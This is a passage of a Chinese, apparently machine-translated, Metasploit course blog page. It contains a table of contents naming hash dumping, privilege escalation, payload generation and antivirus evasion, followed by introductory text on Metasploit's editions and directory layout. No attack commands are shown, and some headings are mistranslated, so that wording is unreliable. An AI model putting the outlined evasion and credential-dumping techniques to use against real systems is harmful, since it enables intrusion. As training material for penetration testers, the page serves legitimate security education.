href="#%E4%BD%BF%E7%94%A8%E4%BC%9A%E8%AF%9D"><span class="toc-text">使用会话</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%B4%BB%E5%8A%A8%E4%BC%9A%E8%AF%9D"><span class="toc-text">列出活动会话</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8E%E4%BC%9A%E8%AF%9D%E4%BA%A4%E4%BA%92"><span class="toc-text">与会话交互</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C"><span class="toc-text">工作</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BD%9C%E4%B8%9A%E5%91%BD%E4%BB%A4%E5%B8%AE%E5%8A%A9%E8%8F%9C%E5%8D%95"><span class="toc-text">查看作业命令帮助菜单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%E5%B8%AE%E5%8A%A9%E8%8F%9C%E5%8D%95"><span class="toc-text">查看漏洞利用命令帮助菜单</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86%E6%BC%8F%E6%B4%9E%E4%BD%9C%E4%B8%BA%E5%90%8E%E5%8F%B0%E4%BD%9C%E4%B8%9A%E8%BF%90%E8%A1%8C"><span class="toc-text">将漏洞作为后台作业运行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%97%E5%87%BA%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E4%BD%9C%E4%B8%9A"><span class="toc-text">列出正在运行的作业</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E4%BB%B7%E5%99%A8"><span class="toc-text">计价器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-Meterpreter"><span class="toc-text">运行 Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-Meterpreter-%E5%91%BD%E4%BB%A4-1"><span class="toc-text">MSF - Meterpreter 命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%BA%AB"><span class="toc-text">隐身</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%BA%E5%A4%A7%E7%9A%84"><span class="toc-text">强大的</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E6%89%A9%E5%B1%95"><span class="toc-text">可扩展</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-Meterpreter"><span class="toc-text">使用 Meterpreter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87"><span class="toc-text">MSF - 扫描目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-text">MSF - 寻找漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%92%8C%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">MSF - 配置漏洞利用和有效载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-Meterpreter-%E8%BF%81%E7%A7%BB"><span class="toc-text">MSF - Meterpreter 迁移</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E4%B8%8E%E7%9B%AE%E6%A0%87%E4%BA%A4%E4%BA%92"><span class="toc-text">MSF - 与目标交互</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E4%BC%9A%E8%AF%9D%E5%A4%84%E7%90%86"><span class="toc-text">MSF - 会话处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E2%80%94%E2%80%94%E7%89%B9%E6%9D%83%E5%8D%87%E7%BA%A7"><span class="toc-text">MSF——特权升级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E8%BD%AC%E5%82%A8%E5%93%88%E5%B8%8C"><span class="toc-text">MSF - 转储哈希</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-Meterpreter-LSA-%E7%A7%98%E5%AF%86%E8%BD%AC%E5%82%A8"><span class="toc-text">MSF - Meterpreter LSA 秘密转储</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E5%92%8C%E5%AF%BC%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-text">编写和导入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%90%9C%E7%B4%A2%E6%BC%8F%E6%B4%9E"><span class="toc-text">MSF - 搜索漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-text">MSF - 目录结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%9C%A8%E8%BF%90%E8%A1%8C%E6%97%B6%E5%8A%A0%E8%BD%BD%E9%99%84%E5%8A%A0%E6%A8%A1%E5%9D%97"><span class="toc-text">MSF - 在运行时加载附加模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E5%8A%A0%E8%BD%BD%E9%99%84%E5%8A%A0%E6%A8%A1%E5%9D%97"><span class="toc-text">MSF - 加载附加模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%86%E8%84%9A%E6%9C%AC%E7%A7%BB%E6%A4%8D%E5%88%B0-Metasploit-%E6%A8%A1%E5%9D%97%E4%B8%AD"><span class="toc-text">将脚本移植到 Metasploit 模块中</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A7%BB%E6%A4%8D-MSF-%E6%A8%A1%E5%9D%97"><span class="toc-text">移植 MSF 模块</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%88%91%E4%BB%AC%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="toc-text">编写我们的模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81-%E8%A6%81%E6%B1%82"><span class="toc-text">概念验证 - 要求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81-%E6%A8%A1%E5%9D%97%E4%BF%A1%E6%81%AF"><span class="toc-text">概念验证 - 模块信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81-%E5%8A%9F%E8%83%BD"><span class="toc-text">概念验证 - 功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5%E9%AA%8C%E8%AF%81"><span class="toc-text">概念验证</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E6%AF%92%E6%B6%B2%E7%AE%80%E4%BB%8B"><span class="toc-text">MSF毒液简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E5%BB%BA%E6%88%91%E4%BB%AC%E7%9A%84%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">创建我们的有效载荷</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E6%A0%87"><span class="toc-text">扫描目标</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FTP-%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE"><span class="toc-text">FTP 匿名访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7"><span class="toc-text">生成有效载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E8%AE%BE%E7%BD%AE-Multi-Handler"><span class="toc-text">MSF - 设置 Multi&#x2F;Handler</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E8%B4%9F%E8%BD%BD"><span class="toc-text">执行负载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-Meterpreter-%E5%A4%96%E5%A3%B3"><span class="toc-text">MSF - Meterpreter 外壳</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BB%BA%E8%AE%AE"><span class="toc-text">本地漏洞利用建议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%90%9C%E7%B4%A2%E6%9C%AC%E5%9C%B0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%BB%BA%E8%AE%AE%E8%80%85"><span class="toc-text">MSF - 搜索本地漏洞利用建议者</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-text">MSF - 本地权限提升</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E7%81%AB%E5%A2%99%E5%92%8C-IDS-IPS-%E8%A7%84%E9%81%BF"><span class="toc-text">防火墙和 IDS&#x2F;IPS 规避</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E7%82%B9%E4%BF%9D%E6%8A%A4"><span class="toc-text">端点保护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%A8%E7%95%8C%E4%BF%9D%E6%8A%A4"><span class="toc-text">周界保护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96"><span class="toc-text">安全政策</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%84%E9%81%BF%E6%8A%80%E6%9C%AF"><span class="toc-text">规避技术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%A3%E6%A1%88"><span class="toc-text">档案</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7-1"><span class="toc-text">生成有效载荷</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%97%85%E6%AF%92%E6%80%BB%E6%95%B0"><span class="toc-text">病毒总数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E6%A1%A3%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD"><span class="toc-text">存档有效负载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4-RAR-%E6%89%A9%E5%B1%95%E5%90%8D"><span class="toc-text">删除 .RAR 扩展名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%8D%E6%AC%A1%E5%BD%92%E6%A1%A3%E6%9C%89%E6%95%88%E8%B4%9F%E8%BD%BD"><span class="toc-text">再次归档有效负载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4-RAR-%E6%89%A9%E5%B1%95%E5%90%8D-1"><span class="toc-text">删除 .RAR 扩展名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%97%85%E6%AF%92%E6%80%BB%E6%95%B0-1"><span class="toc-text">病毒总数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%85%E8%A3%85%E5%B7%A5"><span class="toc-text">包装工</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E7%A0%81"><span class="toc-text">利用编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91-Meterpreter"><span class="toc-text">从源代码重新编译 Meterpreter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E9%80%83%E9%81%BF%E7%9A%84%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-text">关于逃避的注意事项</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95"><span class="toc-text">目录</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#MSF-%E7%BB%84%E4%BB%B6"><span class="toc-text">MSF 组件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%97%A0%E5%9B%BD%E7%95%8C%E5%8C%BB%E7%94%9F%E4%BC%9A%E8%AE%AE"><span class="toc-text">无国界医生会议</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%84%E5%8A%A0%E5%8A%9F%E8%83%BD"><span class="toc-text">附加功能</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E5%B7%A5%E4%BD%9C%E7%AB%99"><span class="toc-text">我的工作站</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Metasploit-%E6%A1%86%E6%9E%B6%E6%9B%B4%E6%96%B0-2020-%E5%B9%B4-8-%E6%9C%88"><span class="toc-text">Metasploit 框架更新 - 2020 年 8 月</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E7%89%B9%E5%BE%81"><span class="toc-text">生成特征</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95%E5%8A%A0%E5%AF%86"><span class="toc-text">扩展加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%B8%85%E6%B4%81%E7%9A%84%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7%E5%B7%A5%E4%BB%B6"><span class="toc-text">更清洁的有效载荷工件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%92%E4%BB%B6-2"><span class="toc-text">插件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E6%95%88%E8%BD%BD%E8%8D%B7-1"><span class="toc-text">有效载荷</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F%E8%AF%AD"><span class="toc-text">结束语</span></a></li></ol></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-6 i,
    .toc-level-6 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工具最近在安全行业的社交媒体圈内引起了激烈的争论。一些讨论围绕某些群体的个人偏好展开，而另一些则旨在评估向公众公开工具的政策。然而，有必要指出自动化工具在当今行业中的重要性。</p>
<p>我们确实听到或将要听到的普遍意见是，在安全评估期间使用自动化工具不是正确的选择。这是因为在与易受攻击的环境交互时，它们无法为安全分析师或渗透测试人员提供“证明”自己的机会。此外，许多人表示，工具使审核员的工作变得过于简单，以至于他们的评估无法获得任何认可。</p>
<p>另一个声音团体不同意 - 那些由信息安全社区的新成员组成的，他们刚刚开始并迈出他们的第一步，以及那些坚持认为工具通过为我们提供对过多的用户更友好的方法来帮助我们更好地学习的论点存在于野外的漏洞，同时为我们节省了评估更复杂部分的时间。我们也将采取这种对抗性的方式来处理这个问题。</p>
<p>在某些情况下，工具确实会给我们带来一些缺点：</p>
<ul>
<li>创建一个难以突破的舒适区来学习新技能</li>
<li>仅仅因为它们在线发布供所有人查看和使用而造成安全风险</li>
<li>营造隧道视觉效果。<code>If the tool cannot do it, neither can I.</code></li>
</ul>
<p>​	就像在工作的创造性部分可以与自动化任务相结合的其他行业一样，工具可以限制我们作为新用户的观点和行动。我们可能错误地认为<code>learn</code>它们提供了所有问题的解决方案，我们开始越来越依赖它们。反过来，这会产生一种隧道视觉效果，这种效果可以而且将会限制用户可能会考虑并采取行动进行评估的可能交互。</p>
<p>​	与此同时，越来越多的这些自动化工具进入公共部门（参见美国国家安全局向公众发布安全工具）这一事实为几乎不了解这些工具的潜在恶意行为者创造了更多可能性行业根据他们快速获利的愿望采取行动，或者在充满小人物的黑暗房间里炫耀他们的努力。</p>
<h2 id="纪律"><a href="#纪律" class="headerlink" title="纪律"></a>纪律</h2><p>如果要从信息安全行业的当前状态中得出任何有辨识力的因素，则必须在我们处于现有技术、协议和系统的持续、加速演进的前提下得出这些因素。由于我们在评估期间遇到大量环境变量，因此必须尽可能节省时间，并为审核员形成强大的安全范例。纪律在所有工作领域都至关重要，结论如下：</p>
<table>
<thead>
<tr>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>我们将永远没有足够的时间来完成评估。由于在每一种环境变化中使用的技术数量众多，我们将没有时间进行完整、全面的评估。时间就是金钱，我们为不懂技术的客户加班加点，我们需要先完成大部分工作：最具潜在影响和修复周转率最高的问题。</td>
</tr>
<tr>
<td>即使我们制作工具或手动利用每项服务，可信度也可能成为问题。我们不是与其他行业成员竞争，而是与客户管理层预先设定的经济条件和个人信念竞争。他们不会理解或非常重视荣誉。他们只希望在最短的时间内完成尽可能多的工作。</td>
</tr>
<tr>
<td>您只需要打动自己，而不是信息安全社区。如果我们做到了前者，后者自然会到来。使用与上述相同的示例，许多在线存在的艺术家在追求在线验证时偏离了最初的目标。他们的艺术对于敏锐的眼睛来说变得陈旧和普通，但对于日常用户来说，它包含了他们想要的视觉元素和主题，而不是那些他们的追随者还不知道他们想要的。作为安全研究人员或渗透测试人员，我们只需要验证漏洞，而不是验证我们的自我。</td>
</tr>
</tbody></table>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>我们必须从内到外分析和了解我们的工具，以保持我们的踪迹并避免在评估期间发生灾难性事件。许多工具可以证明是不可预测的。有些可能会在目标系统上留下活动痕迹，有些可能会让我们的攻击者平台敞开大门。尽管如此，只要我们遵守此处的规则，它们就可以成为初学者的宝贵教育平台，以及专业人士所需的节省时间的机制。</p>
<p>不要有隧道视野。将该工具用作工具，而不是我们完整评估的支柱或生命支持。</p>
<p>请阅读您可以找到的有关我们任何工具的所有技术文档。请深入了解他们。千方百计（或函数或类）。这将帮助我们避免意外行为或愤怒的客户和律师团队。</p>
<p>假设我们审核我们的工具并为自己设置一个可靠的方法来进行初步检查和攻击路径。在这种情况下，工具将为我们节省进一步研究和对我们的安全研究范式进行长期具体探索的时间。考虑到越来越多的技术出现在当今环境中的速度越来越快，这项进一步的研究应该侧重于对安全机制的更深入理解，进一步对更抽象的安全对象进行审计，以扩大分析范围。这就是我们作为专业人士的发展方式。</p>
<h1 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a>Metasploit简介</h1><p>​	这<code>Metasploit Project</code>是一个基于 Ruby 的模块化渗透测试平台，使您能够编写、测试和执行漏洞利用代码。该漏洞利用代码可以由用户定制，也可以从包含已发现的最新模块化漏洞利用的数据库中获取。其中<code>Metasploit Framework</code>包括一套工具，可用于测试安全漏洞、枚举网络、执行攻击和逃避检测。其核心<code>Metasploit Project</code>是一组常用工具，为渗透测试和漏洞利用开发提供了完整的环境。</p>
<p><img src="/.com//%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6%5C1.png"></p>
<p>​	提到<code>modules</code>的是实际的漏洞利用概念验证，已经在野外开发和测试并集成在框架内，以便渗透测试人员可以轻松访问针对不同平台和服务的不同攻击向量。Metasploit 不是万事通，而是一把瑞士军刀，其工具足以帮助我们解决最常见的未修补漏洞。</p>
<p>​	它的强项在于它提供了大量可用的目标和版本，所有这些都离成功的立足点很远。这些，结合为那些易受攻击的版本量身定制的漏洞利用以及在漏洞利用后发送的有效负载，这将使我们能够实际访问系统，为我们提供了一种简单、自动化的方式来在我们的帖子期间在目标连接之间切换- 开发企业。</p>
<h2 id="Metasploit-Pro"><a href="#Metasploit-Pro" class="headerlink" title="Metasploit Pro"></a>Metasploit Pro</h2><p><code>Metasploit</code>作为一个产品分为两个版本。该<code>Metasploit Pro</code>版本与具有一些附加功能的版本不同<code>Metasploit Framework</code>：</p>
<ul>
<li>任务链</li>
<li>社会工程学</li>
<li>漏洞验证</li>
<li>图形用户界面</li>
<li>快速启动向导</li>
<li>集成</li>
</ul>
<p>如果您更喜欢命令行用户并且更喜欢额外的功能，那么专业版还包含自己的控制台，就像<code>msfconsole</code>.</p>
<p>要大致了解 Metasploit Pro 的最新功能可以实现什么，请查看以下列表：</p>
<table>
<thead>
<tr>
<th><strong>浸润</strong></th>
<th><strong>收集数据</strong></th>
<th><strong>修复</strong></th>
</tr>
</thead>
<tbody><tr>
<td>手动开发</td>
<td>导入和扫描数据</td>
<td>暴力破解</td>
</tr>
<tr>
<td>防病毒规避</td>
<td>发现扫描</td>
<td>任务链</td>
</tr>
<tr>
<td>IPS&#x2F;IDS规避</td>
<td>元模块</td>
<td>开发工作流程</td>
</tr>
<tr>
<td>代理枢轴</td>
<td>Nexpose 扫描集成</td>
<td>会话重新运行</td>
</tr>
<tr>
<td>开发后</td>
<td></td>
<td>任务回放</td>
</tr>
<tr>
<td>会话清理</td>
<td></td>
<td>项目声纳集成</td>
</tr>
<tr>
<td>凭据重用</td>
<td></td>
<td>会话管理</td>
</tr>
<tr>
<td>社会工程学</td>
<td></td>
<td>凭证管理</td>
</tr>
<tr>
<td>有效载荷生成器</td>
<td></td>
<td>团队协作</td>
</tr>
<tr>
<td>快速渗透测试</td>
<td></td>
<td>网络界面</td>
</tr>
<tr>
<td>VPN 枢轴</td>
<td></td>
<td>备份还原</td>
</tr>
<tr>
<td>漏洞验证</td>
<td></td>
<td>数据导出</td>
</tr>
<tr>
<td>网络钓鱼向导</td>
<td></td>
<td>证据收集</td>
</tr>
<tr>
<td>网络应用测试</td>
<td></td>
<td>报告</td>
</tr>
<tr>
<td>持久会话</td>
<td></td>
<td>标记数据</td>
</tr>
</tbody></table>
<h2 id="Metasploit-框架控制台"><a href="#Metasploit-框架控制台" class="headerlink" title="Metasploit 框架控制台"></a>Metasploit 框架控制台</h2><p>可能<code>msfconsole</code>是最流行的<code>Metasploit Framework</code> <code>(MSF)</code>. 它提供了一个“一体式”集中式控制台，并允许您高效地访问<code>MSF</code>. <code>Msfconsole</code>一开始可能看起来很吓人，但是一旦您了解了命令的语法，您就会学会欣赏使用此界面的强大功能。</p>
<p>一般带来的功能<code>msfconsole</code>有以下几点：</p>
<ul>
<li>这是访问其中大部分功能的唯一受支持的方式<code>Metasploit</code></li>
<li>提供基于控制台的界面<code>Framework</code></li>
<li>包含最多的功能，是最稳定的<code>MSF</code>界面</li>
<li>完整的 readline 支持、制表符和命令完成</li>
<li>执行外部命令<code>msfconsole</code></li>
</ul>
<p>上述两种产品都带有一个广泛的可用模块数据库，可用于我们的评估。这些与外部命令（如扫描器、社会工程工具包和有效负载生成器）的使用相结合，可以将我们的设置变成一个随时可用的机器，使我们能够通过使用无缝地控制和操纵野外的不同漏洞会话和作业的方式与我们在 Internet 浏览器上看到选项卡的方式相同。</p>
<p>这里的关键术语是可用性——用户体验。我们可以轻松控制控制台可以改善我们的学习体验。因此，让我们深入研究细节。</p>
<h2 id="了解架构"><a href="#了解架构" class="headerlink" title="了解架构"></a>了解架构</h2><p>要完全操作我们正在使用的任何工具，我们必须首先了解它的内部结构。这是一种很好的做法，它可以让我们更好地了解当该工具发挥作用时我们的安全评估过程中会发生什么。重要的是不要使用<a target="_blank" rel="noopener" href="https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/">任何可能使您或您的客户面临数据泄露风险的通配符</a>。</p>
<p><code>/usr/share/metasploit-framework</code>默认情况下，所有与 Metasploit Framework 相关的基础文件都可以在我们的发行版中找到<code>ParrotOS Security</code>。</p>
<h4 id="数据、文档、库"><a href="#数据、文档、库" class="headerlink" title="数据、文档、库"></a>数据、文档、库</h4><p>这些是框架的基础文件。Data 和 Lib 是 msfconsole 界面的功能部分，而 Documentation 文件夹包含有关该项目的所有技术细节。</p>
<h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p>上面详述的模块在此文件夹中分为不同的类别。我们将在下一节中详细介绍这些内容。它们包含在以下文件夹中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules</span><br><span class="line"></span><br><span class="line">auxiliary  encoders  evasion  exploits  nops  payloads  post</span><br></pre></td></tr></table></figure>

<h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h4><p>插件在使用时为渗透测试人员提供了更大的灵活性，<code>msfconsole</code>因为它们可以根据需要轻松地手动或自动加载，以在我们的评估期间提供额外的功能和自动化。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/</span><br><span class="line"></span><br><span class="line">aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb</span><br><span class="line">alias.rb           komand.rb      pcap_log.rb          sqlmap.rb</span><br><span class="line">auto_add_route.rb  lab.rb         request.rb           thread.rb</span><br><span class="line">beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb</span><br><span class="line">db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb</span><br><span class="line">db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb</span><br><span class="line">event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb</span><br><span class="line">ffautoregen.rb     nexpose.rb     socket_logger.rb</span><br></pre></td></tr></table></figure>

<h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>Meterpreter 功能和其他有用的脚本。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/</span><br><span class="line"></span><br><span class="line">meterpreter  ps  resource  shell</span><br></pre></td></tr></table></figure>

<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>可以直接从菜单调用的命令行实用程序<code>msfconsole</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/tools/</span><br><span class="line"></span><br><span class="line">context  docs     hardware  modules   payloads</span><br><span class="line">dev      exploit  memdump   password  recon</span><br></pre></td></tr></table></figure>

<p>现在我们知道了所有这些位置，当我们决定导入新模块甚至从头开始创建新模块时，我们将来可以很容易地引用它们。</p>
<h2 id="MSF控制台简介"><a href="#MSF控制台简介" class="headerlink" title="MSF控制台简介"></a>MSF控制台简介</h2><p>要开始与 Metasploit Framework 交互，我们需要输入<code>msfconsole</code>我们选择的终端。许多面向安全的发行版（例如 Parrot Security 和 Kali Linux）都预装了<code>msfconsole</code>。与任何其他命令行工具一样，我们可以在启动脚本时使用其他几个选项。这些从图形显示开关&#x2F;选项到程序开关&#x2F;选项不等。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>启动后<code>msfconsole</code>，我们会看到他们创造的启动画面和命令行提示符，等待我们的第一个命令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 